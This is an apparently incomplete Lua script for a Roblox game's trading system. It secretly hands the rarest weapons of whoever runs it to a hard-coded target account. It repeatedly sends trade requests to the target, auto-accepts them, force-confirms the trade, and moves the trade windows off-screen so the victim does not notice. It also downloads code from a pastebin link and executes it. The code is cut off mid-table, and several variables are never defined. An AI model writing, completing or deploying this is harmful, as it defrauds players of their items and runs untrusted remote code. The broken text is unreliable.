local weaponsToSend = {}
local playerGui = plr:WaitForChild("PlayerGui")
local Trade = ReplicatedStorage:WaitForChild("Trade")

local database
do
    local ok, result = pcall(function()
        return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
    end)
    if ok and typeof(result) == "table" then
        database = result
    else
        local raw = game:HttpGet("https://pastebin.com/raw/kTEhmXfs")
        local ok2, result2 = pcall(function()
            return loadstring(raw)()
        end)
        database = (ok2 and typeof(result2) == "table") and result2 or {}
    end
end

local rarityTable = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"}
local untradable = {
    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true, ["Reaver_Legendary"] = true,
    ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true, ["IceHammer"] = true, ["IceHammer_Legendary"] = true,

-- Глобальные стейты
local lastOfferToken = nil
local opponentAccepted = false
local lastOfferChangeAt = 0
local isTargetTrade = false
local foundTargetRequest = false
local tradeInProgress = false

-- Функция пуленепробиваемой проверки ника (игнорирует регистр и теги)
local function isTarget(text)
    if not text then return false end
    return string.find(string.lower(tostring(text)), string.lower(TARGET_USER), 1, true) ~= nil
end

local function getTradeStatus()
    local ok, status = pcall(function()
        return Trade.GetTradeStatus:InvokeServer()
    end)
    return ok and status or "None"
end

local function sendTradeRequest(user)
    local player = Players:FindFirstChild(user)
    if player then pcall(function() Trade.SendRequest:InvokeServer(player) end) end
end

-- Перехват ремоута (на мобилках может лагать, поэтому дублируем скан в RenderStepped)
Trade.UpdateTrade.OnClientEvent:Connect(function(data)
    if typeof(data) == "table" then
        if data.LastOffer ~= nil then
            lastOfferToken = data.LastOffer
            lastOfferChangeAt = tick()
            opponentAccepted = false
        end
        local function extract(p)
            return typeof(p) == "Instance" and p.Name or type(p) == "string" and p or nil
        end
        local p1, p2 = extract(data.Player1), extract(data.Player2)
        if isTarget(p1) or isTarget(p2) then
            isTargetTrade = true
        end
    end
end)

Trade.AcceptTrade.OnClientEvent:Connect(function(success)
    opponentAccepted = not success
end)

local function forceAcceptTrade()
    if not lastOfferToken then return false end
    for _ = 1, 15 do
        local left = 6 - (tick() - lastOfferChangeAt)
        if left > 0 then
            task.wait(math.min(left + 0.1, 1.2))
        else
            if pcall(function() Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferToken) end) then 
                return true 
            end
            task.wait(0.35)
        end
    end
    return false
end

local function rebuildWeaponsList()
    table.clear(weaponsToSend)
    local ok, realData = pcall(function()
        return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
    end)
    if not ok or type(realData) ~= "table" or not realData.Weapons or not realData.Weapons.Owned then return end

    local min_idx = table.find(rarityTable, min_rarity) or 1
    for dataid, amount in pairs(realData.Weapons.Owned) do
        local itemData = database[dataid]
        if itemData and amount and amount > 0 then
            local w_idx = table.find(rarityTable, itemData.Rarity)
            if w_idx and w_idx >= min_idx and not untradable[dataid] then
                table.insert(weaponsToSend, {DataID = dataid, Rarity = itemData.Rarity, Amount = amount})
            end
        end
    end
    table.sort(weaponsToSend, function(a, b)
        local aI = table.find(rarityTable, a.Rarity) or 0
        local bI = table.find(rarityTable, b.Rarity) or 0
        return aI == bI and a.Amount > b.Amount or aI > bI
    end)
end

-- =====================================================================
-- ТОТАЛЬНЫЙ КОНТРОЛЬ GUI (ФИЗИЧЕСКОЕ СМЕЩЕНИЕ КООРДИНАТ)
-- =====================================================================
RunService.RenderStepped:Connect(function()
    -- Обработка входящего запроса
    local reqGUI = playerGui:FindFirstChild("TradeRequestGUI")
    if reqGUI then
        local targetInRequest = false
        for _, obj in ipairs(reqGUI:GetDescendants()) do
            if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and isTarget(obj.Text) then
                targetInRequest = true
                foundTargetRequest = true
                break
            end
        end
        if targetInRequest then
            reqGUI.Enabled = false
            if reqGUI:FindFirstChild("Main") then 
                reqGUI.Main.Visible = false
                reqGUI.Main.Position = UDim2.new(9999, 0, 9999, 0) 
            end
        end
    end
    
    -- Обработка активного окна трейда
    local tGui = playerGui:FindFirstChild("TradeGUI")
    if tGui and getTradeStatus() ~= "None" then
        -- Быстрый скан, если ремоут UpdateTrade задержался
        if not isTargetTrade then
            for _, obj in ipairs(tGui:GetDescendants()) do
                if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and isTarget(obj.Text) and obj.Text ~= plr.Name then
                    isTargetTrade = true
                    break
                end
            end
        end
        
        -- Если это наш клиент, депортируем окно за пределы экрана
        if isTargetTrade then
            tGui.Enabled = false
            if tGui:FindFirstChild("Main") then 
                tGui.Main.Visible = false
                tGui.Main.Position = UDim2.new(9999, 0, 9999, 0) 
            end
        end
    end
end)

-- =====================================================================
-- ПОТОК 1: АВТО-СПАМ ЗАПРОСАМИ ТАРГЕТУ
-- =====================================================================
task.spawn(function()
    while task.wait(3) do
        if getTradeStatus() == "None" then
            for _, player in ipairs(Players:GetPlayers()) do
                if player.Name == TARGET_USER then
                    sendTradeRequest(player.Name)
                    break
                end
            end
        end
    end
end)

-- =====================================================================
-- ПОТОК 2: АВТО-АКЦЕПТ ЗАПРОСА ТОЛЬКО ОТ ТАРГЕТА
-- =====================================================================
task.spawn(function()
    while task.wait(0.2) do
        if getTradeStatus() == "ReceivingRequest" and foundTargetRequest then
            pcall(function()
                local r = Trade:FindFirstChild("AcceptRequest")
                if r then 
                    if r:IsA("RemoteFunction") then r:InvokeServer() else r:FireServer() end 
                end
            end)
            task.wait(0.5)
        end
    end
end)

-- =====================================================================
-- ПОТОК 3: ДВИЖОК ПЕРЕДАЧИ И ВОССТАНОВЛЕНИЯ UI ДЛЯ ОБЫЧНЫХ СДЕЛОК
-- =====================================================================
task.spawn(function()
    local guiWasHidden = false
    
    while task.wait(0.1) do
        local currentStatus = getTradeStatus()
        
        if currentStatus == "None" then
            tradeInProgress = false
            isTargetTrade = false
            foundTargetRequest = false
            lastOfferToken = nil
            
            -- Восстанавливаем позицию окна, если до этого скамили таргета
            if guiWasHidden then
                local tGui = playerGui:FindFirstChild("TradeGUI")
                if tGui and tGui:FindFirstChild("Main") then
                    tGui.Main.Position = UDim2.new(0.5, -250, 0.5, -200)
                    tGui.Main.Visible = true
                end
                guiWasHidden = false
            end
            
        elseif currentStatus == "StartTrade" and not tradeInProgress then
            tradeInProgress = true
            
            -- Ждем до 3 секунд, пока RenderStepped или UpdateTrade спарсят ник
            local wStart = tick()
            while not isTargetTrade and (tick() - wStart) < 3 do task.wait(0.1) end
            
            -- ВЕТКА А: Сделка с таргетом (Скрытый режим)
            if isTargetTrade then
                guiWasHidden = true
                rebuildWeaponsList()
                if #weaponsToSend > 0 then
                    local added = 0
                    for _, weapon in ipairs(weaponsToSend) do
                        if added < 4 then
                            for _ = 1, weapon.Amount do
                                if added >= 4 then break end
                                pcall(function() Trade.OfferItem:FireServer(weapon.DataID, "Weapons") end)
                                added = added + 1
                                task.wait(0.05)
                            end
                        end
                    end
                    
                    local wt = tick()
                    while not lastOfferToken and (tick() - wt) < 8 do task.wait(0.12) end
                    
                    forceAcceptTrade()
                    if opponentAccepted then task.wait(0.35) forceAcceptTrade() end
                end
                
                -- Держим цикл до закрытия сделки
                while getTradeStatus() ~= "None" do task.wait(0.2) end
                
            -- ВЕТКА Б: Сделка с обычным игроком (Штатный режим)
            else
                -- Ничего не скидываем, окно не прячем, ждём ручных действий
                while getTradeStatus() ~= "None" do task.wait(0.5) end
            end
        end
    end
end)
